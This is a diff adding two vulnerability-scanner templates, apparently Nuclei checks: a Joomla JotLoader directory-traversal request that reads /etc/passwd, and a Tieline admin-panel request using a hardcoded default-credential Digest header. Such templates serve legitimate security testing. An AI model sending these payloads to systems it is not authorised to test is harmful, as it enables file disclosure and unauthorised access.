@@ -542,6 +542,40 @@
       ]
     },
     {
+      "id": "CVE-2010-4617",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the JotLoader (com_jotloader) component 2.2.1 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the section parameter to index.php.",
+        "name": "Joomla! Component JotLoader 2.2.1 - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/15791\n- https://www.cvedetails.com/cve/CVE-2010-4617\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_jotloader&section=../../../../../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2011-0049",
       "info": {
         "author": "pikpikcu",
@@ -21797,6 +21831,54 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/http_header.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021–35336",
+      "info": {
+        "author": "Pratik Khalane",
+        "description": "Finding the Tieline Admin Panels with default credentials.",
+        "name": "Unauthorised Remote Access of Internal Panel",
+        "reference": "- https://pratikkhalane91.medium.com/use-of-default-credentials-to-unauthorised-remote-access-of-internal-panel-of-tieline-c1ffe3b3757c\n- https://nvd.nist.gov/vuln/detail/CVE-2021-35336\n",
+        "severity": "critical",
+        "tags": "cve,cve2021,tieline,default-login"
+      },
+      "requests": [
+        {
+          "headers": {
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
+          },
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "<SERIAL>",
+                "<VERSION>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/xml"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/api/get_device_details"
           ]
         }
       ]
